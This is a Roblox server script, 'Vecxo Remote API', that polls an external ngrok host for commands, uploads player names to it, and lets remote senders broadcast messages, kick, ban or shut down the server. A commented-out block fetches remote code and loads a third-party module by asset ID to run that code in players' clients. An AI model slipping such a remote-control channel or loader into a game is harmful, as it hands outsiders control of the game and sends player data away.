local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

local COMMAND_URL = "https://vecxoremoteapi.ngrok.pro/latest-command"
local REGISTER_URL = "https://vecxoremoteapi.ngrok.pro/register-server"
local REPORT_URL = "https://vecxoremoteapi.ngrok.pro/report-players"

local banned = {}
local serverId = game.JobId
local serverLabel = "unknown"

task.spawn(function()
	while true do
		local success, res = pcall(function()
			return HttpService:PostAsync(
				REGISTER_URL,
				HttpService:JSONEncode({ serverId = serverId }),
				Enum.HttpContentType.ApplicationJson
			)
		end)
		if success then
			local data = HttpService:JSONDecode(res)
			if data and data.label then
				serverLabel = data.label
			end
		end
		task.wait(30)
	end
end)

local function runCommand(cmd)
	if not cmd or not cmd.text then return end

	local sender = cmd.sender or "Err"
	local text = cmd.text:lower()

	print("[COMMAND RECEIVED] From:", sender, "| Command:", text)

	if text:sub(1, 2) == "m " then
		local msg = cmd.text:sub(3)
		for _, player in pairs(Players:GetPlayers()) do
			task.spawn(function()
				local gui = Instance.new("ScreenGui")
				gui.Name = "FullScreenAnnouncement"
				gui.ResetOnSpawn = false
				gui.IgnoreGuiInset = true
				gui.Parent = player:FindFirstChildOfClass("PlayerGui")

				local bg = Instance.new("Frame")
				bg.Size = UDim2.new(1, 0, 1, 0)
				bg.Position = UDim2.new(0, 0, 0, 0)
				bg.BackgroundColor3 = Color3.new(0, 0, 0)
				bg.BackgroundTransparency = 1 -- starts invisible
				bg.Parent = gui

				local container = Instance.new("Frame")
				container.Size = UDim2.new(1, -100, 0, 180) -- increased height for 3 lines
				container.Position = UDim2.new(0.5, 0, 0.5, 0)
				container.AnchorPoint = Vector2.new(0.5, 0.5)
				container.BackgroundTransparency = 1
				container.Parent = bg

				local titleLabel = Instance.new("TextLabel")
				titleLabel.Size = UDim2.new(1, 0, 0, 40)
				titleLabel.Position = UDim2.new(0, 0, 0, 0)
				titleLabel.BackgroundTransparency = 1
				titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
				titleLabel.TextStrokeTransparency = 0.4
				titleLabel.Font = Enum.Font.Code
				titleLabel.TextScaled = true
				titleLabel.Text = "[Vecxo Remote API]:"
				titleLabel.Parent = container

				local senderLabel = Instance.new("TextLabel")
				senderLabel.Size = UDim2.new(1, 0, 0, 40)
				senderLabel.Position = UDim2.new(0, 0, 0, 40)
				senderLabel.BackgroundTransparency = 1
				senderLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
				senderLabel.TextStrokeTransparency = 0.6
				senderLabel.Font = Enum.Font.Code
				senderLabel.TextScaled = true
				senderLabel.Text = `{sender}`
				senderLabel.Parent = container

				local messageLabel = Instance.new("TextLabel")
				messageLabel.Size = UDim2.new(1, 0, 0, 90)
				messageLabel.Position = UDim2.new(0, 0, 0, 80)
				messageLabel.BackgroundTransparency = 1
				messageLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
				messageLabel.TextStrokeTransparency = 0.4
				messageLabel.Text = ""
				messageLabel.Font = Enum.Font.Code
				messageLabel.TextScaled = true
				messageLabel.TextWrapped = true
				messageLabel.Parent = container

				local tweenService = game:GetService("TweenService")


				local fadeIn = tweenService:Create(bg, TweenInfo.new(0.5), { BackgroundTransparency = 0.4 })
				fadeIn:Play()
				fadeIn.Completed:Wait()

				local fullText = `{msg}`
				for i = 1, #fullText do
					messageLabel.Text = string.sub(fullText, 1, i)
					task.wait(0.025)
				end

				task.delay(5, function()
					local fadeOutBg = tweenService:Create(bg, TweenInfo.new(0.5), { BackgroundTransparency = 1 })
					local fadeOutMessage = tweenService:Create(messageLabel, TweenInfo.new(0.5), { TextTransparency = 1, TextStrokeTransparency = 1 })
					local fadeOutTitle = tweenService:Create(titleLabel, TweenInfo.new(0.5), { TextTransparency = 1, TextStrokeTransparency = 1 })
					local fadeOutSender = tweenService:Create(senderLabel, TweenInfo.new(0.5), { TextTransparency = 1, TextStrokeTransparency = 1 })
					fadeOutBg:Play()
					fadeOutMessage:Play()
					fadeOutTitle:Play()
					fadeOutSender:Play()
					fadeOutBg.Completed:Wait()
					gui:Destroy()
				end)
			end)
		end
	end

--[[	local TextChatService = game:GetService("TextChatService")
	local channel = TextChatService:FindFirstChild("TextChannels") and TextChatService.TextChannels:FindFirstChild("RBXGeneral")

	if text:sub(1, 5) == "chat " then
		local msg = text:sub(6)
		local HttpService = game:GetService("HttpService")
		local code
		local success, err = pcall(function()
			code = HttpService:GetAsync("https://raw.githubusercontent.com/reloxz/zastuff/refs/heads/main/RoChatAPI")
		end)

		if not success then
			warn'http failed with chat api'
			return
		end

		local formattedMessage = `{sender}: {msg}`
		code = code:gsub('%[Vecko%]: asd', formattedMessage)

		for i, plr in pairs(game.Players:GetPlayers()) do
			if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
				local ticking = tick()
				require(112354705578311).load()
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
			end
			local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")
			if not goog then
				warn("goog failed to be added, command cannot continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			scr:WaitForChild("Exec").Value = code
			if plr.Character then
				scr.Parent = plr:WaitForChild("PlayerGui")
			end
			scr.Enabled = true
		end
	end ]]

	if text:sub(1, 2) == "h " then
		local msg = cmd.text:sub(3)
		for _, player in pairs(Players:GetPlayers()) do
			task.spawn(function()
				local gui = Instance.new("ScreenGui")
				gui.Name = "RemoteAnnouncement"
				gui.ResetOnSpawn = false
				gui.IgnoreGuiInset = true
				gui.Parent = player:FindFirstChildOfClass("PlayerGui")
				local label = Instance.new("TextLabel")
				label.Size = UDim2.new(1, 0, 0, 40)
				label.Position = UDim2.new(0, 0, -0.1, 0)
				label.BackgroundTransparency = 0.3
				label.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
				label.TextColor3 = Color3.fromRGB(255, 255, 255)
				label.TextStrokeTransparency = 0.5
				label.Font = Enum.Font.Ubuntu
				label.TextScaled = true
				label.Text = ""
				label.Parent = gui
				local tweenService = game:GetService("TweenService")
				local tweenIn = tweenService:Create(label, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
					Position = UDim2.new(0, 0, 0, 0)
				})
				tweenIn:Play()
				tweenIn.Completed:Wait()
				local fullText = `[Vecxo Remote API] - {sender}: {msg}`
				for i = 1, #fullText do
					label.Text = string.sub(fullText, 1, i)
					task.wait(0.04)
				end
				task.delay(5, function()
					local tweenOut = tweenService:Create(label, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
						Position = UDim2.new(0, 0, -0.1, 0)
					})
					tweenOut:Play()
					tweenOut.Completed:Wait()
					gui:Destroy()
				end)
			end)
		end
	end

	if text:sub(1, 5) == "kick " then
		local target = text:sub(6):lower()
		for _, p in pairs(Players:GetPlayers()) do
			if p.Name:lower():sub(1, #target) == target then
				p:Kick(`[Vecxo Remote API] Kicked by {sender}`)
				break
			end
		end
	end

	if text:sub(1, 4) == "ban " then
		local target = text:sub(5):lower()
		for _, p in pairs(Players:GetPlayers()) do
			if p.Name:lower():sub(1, #target) == target then
				table.insert(banned, p.Name)
				p:Kick(`[Vecxo Remote API] Banned by {sender}`)
				break
			end
		end
	end

	if text:sub(1, 9) == "shutdown " then
		for _, p in pairs(Players:GetPlayers()) do
			p:Kick(`[Vecxo Remote API] Shutdown by {sender}`)
		end
		game:Shutdown()
	end
end

local TweenService = game:GetService("TweenService")

function notifyv2(player, title, message)
	local playerGui = player:WaitForChild("PlayerGui")

	local screenGui = Instance.new("ScreenGui")
	screenGui.Name = "VecxoHintGui"
	screenGui.ResetOnSpawn = false
	screenGui.Parent = playerGui


	local frame = Instance.new("Frame")
	frame.Size = UDim2.new(0, 300, 0, 80)
	frame.AnchorPoint = Vector2.new(1, 1)
	frame.Position = UDim2.new(1, -20, 1, -20)
	frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	frame.BackgroundTransparency = 0.8
	frame.BorderSizePixel = 0
	frame.Parent = screenGui
	frame.ClipsDescendants = true
	frame.AutomaticSize = Enum.AutomaticSize.Y


	local titleLabel = Instance.new("TextLabel")
	titleLabel.Size = UDim2.new(1, -20, 0, 30)
	titleLabel.Position = UDim2.new(0, 10, 0, 10)
	titleLabel.BackgroundTransparency = 1
	titleLabel.Text = title
	titleLabel.Font = Enum.Font.GothamBold
	titleLabel.TextSize = 20
	titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
	titleLabel.TextXAlignment = Enum.TextXAlignment.Left
	titleLabel.Parent = frame

	local messageLabel = Instance.new("TextLabel")
	messageLabel.Size = UDim2.new(1, -20, 0, 40)
	messageLabel.Position = UDim2.new(0, 10, 0, 40)
	messageLabel.BackgroundTransparency = 1
	messageLabel.Text = message
	messageLabel.Font = Enum.Font.Gotham
	messageLabel.TextSize = 16
	messageLabel.TextColor3 = Color3.fromRGB(230, 230, 230)
	messageLabel.TextWrapped = true
	messageLabel.TextXAlignment = Enum.TextXAlignment.Left
	messageLabel.TextYAlignment = Enum.TextYAlignment.Top
	messageLabel.Parent = frame

	frame.BackgroundTransparency = 1
	titleLabel.TextTransparency = 1
	messageLabel.TextTransparency = 1

	local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

	local fadeInGoals = {
		BackgroundTransparency = 0.8,
	}
	local fadeInTitleGoals = {
		TextTransparency = 0,
	}
	local fadeInMessageGoals = {
		TextTransparency = 0,
	}

	-- Create tweens
	local fadeInTween = TweenService:Create(frame, tweenInfo, fadeInGoals)
	local fadeInTitleTween = TweenService:Create(titleLabel, tweenInfo, fadeInTitleGoals)
	local fadeInMessageTween = TweenService:Create(messageLabel, tweenInfo, fadeInMessageGoals)

	fadeInTween:Play()
	fadeInTitleTween:Play()
	fadeInMessageTween:Play()

	fadeInTween.Completed:Wait()

	task.wait(4)

	local fadeOutTween = TweenService:Create(frame, tweenInfo, {BackgroundTransparency = 1})
	local fadeOutTitleTween = TweenService:Create(titleLabel, tweenInfo, {TextTransparency = 1})
	local fadeOutMessageTween = TweenService:Create(messageLabel, tweenInfo, {TextTransparency = 1})

	fadeOutTween:Play()
	fadeOutTitleTween:Play()
	fadeOutMessageTween:Play()

	fadeOutTween.Completed:Wait()

	screenGui:Destroy()
end



Players.PlayerAdded:Connect(function(player)
	if table.find(banned, player.Name) then
		player:Kick("[Vecxo Remote API] You were remotely banned from the server.")
	end
end)

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")

local DEBOUNCE_DELAY = 45
local debounceThread = nil

local function sendRequestNow()
	local playerNames = {}
	task.wait(0.5)
	for _, player in ipairs(Players:GetPlayers()) do
		table.insert(playerNames, player.Name)
	end

	local success, err = pcall(function()
		HttpService:PostAsync(
			REPORT_URL,
			HttpService:JSONEncode({
				serverId = serverId,
				players = playerNames
			}),
			Enum.HttpContentType.ApplicationJson
		)
	end)

	if not success then
		warn("[Vecxo Remote API] Failed to auto-report players:", err)
	end
end

local function debounceReport()
	if debounceThread then
		task.cancel(debounceThread)
	end
	debounceThread = task.delay(DEBOUNCE_DELAY, sendRequestNow)
end

task.spawn(sendRequestNow)

Players.PlayerAdded:Connect(debounceReport)
Players.PlayerRemoving:Connect(debounceReport)

task.spawn(function()
	while true do
		task.wait(2.8)
		local success, response = pcall(function()
			local url = COMMAND_URL .. "?serverId=" .. HttpService:UrlEncode(serverId)
			return HttpService:GetAsync(url)
		end)
		if success then
			local data = HttpService:JSONDecode(response)
			if data and data.command then
				runCommand(data.command)
			end
		else
			warn("Command fetch failed:", response)
		end
	end
end)

for i, v in pairs(game.Players:GetPlayers()) do
	notifyv2(v, "[Vecxo Lite]", "✅ Remote API Successfully connected")
end
